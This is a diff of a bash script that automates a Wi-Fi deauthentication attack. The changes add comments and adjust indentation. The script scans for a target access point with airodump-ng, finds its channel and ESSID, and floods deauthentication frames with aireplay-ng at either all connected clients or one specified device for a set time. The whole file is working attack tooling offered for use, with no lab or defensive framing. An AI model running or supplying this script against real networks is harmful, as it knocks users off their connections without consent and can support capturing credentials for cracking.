@@ -1,27 +1,34 @@
 #!/bin/bash
 
+# reading configs
 source ./config.cfg
 SCAN_TIME=$AUTO_SCAN_TIME
 INJECTION_TIME=$AUTO_INJECTION_TIME
 
+# pipe output to stdout and designated log file
 exec > >(tee -a "$CHAINSAW_LOG") 2>&1
 
+# preliminary analysis of wireless network
 echo "Sampling wireless data"
 rm tempdump*
 airodump-ng -w tempdump --output-format csv --write-interval 3 --background 1 $IFACE & pid=$!
 sleep $SCAN_TIME
 kill "$pid"
 
+# processing the datas
 echo "Preparing data"
 mv tempdump-01.csv tempdump.csv
 TARGET_CHANNEL=$(grep "$TARGET_BSSID" tempdump.csv | awk -F, '{sub(/^ *| *$/,"",$4); print $4}')
 
+# if target channel can't be found, just exit the script
 if [ -z "$TARGET_CHANNEL" ]; then
-  echo "Target BSSID not found. Exiting."
-  exit 1
+	echo "Target BSSID not found. Exiting."
+	exit 1
 fi
 
+# filter out more than two chars of the channel result, may caused by station section of the airodump-ng output
 TARGET_CHANNEL="${TARGET_CHANNEL:0:2}"
+# determine ESSID for informational purpose only
 TARGET_ESSID=$(grep "$TARGET_BSSID" tempdump.csv | awk -F, '{sub(/^ *| *$/,"",$4); print $14}')
 
 echo "Automated channel targeting..."
@@ -30,14 +37,17 @@ echo "Target BSSID = $TARGET_BSSID"
 echo "Target channel = $TARGET_CHANNEL"
 echo "Injecting deAuth frame for $INJECTION_TIME second(s)"
 
+# set the channel of monitor interface
 iwconfig $IFACE channel $TARGET_CHANNEL
 
 if [ -z "$TARGET_DEVICE" ]
 then
+	# if target device unspecified, deauth all devices
 	aireplay-ng -0 0 -a $TARGET_BSSID $IFACE --ignore-negative-one & pid=$!
 	sleep $INJECTION_TIME
 	kill "$pid"
 else
+	# if target device specified, deauth only speficied device
     aireplay-ng -0 0 -a $TARGET_BSSID -c $TARGET_DEVICE $IFACE --ignore-negative-one & pid=$!
 	sleep $INJECTION_TIME
 	kill "$pid"
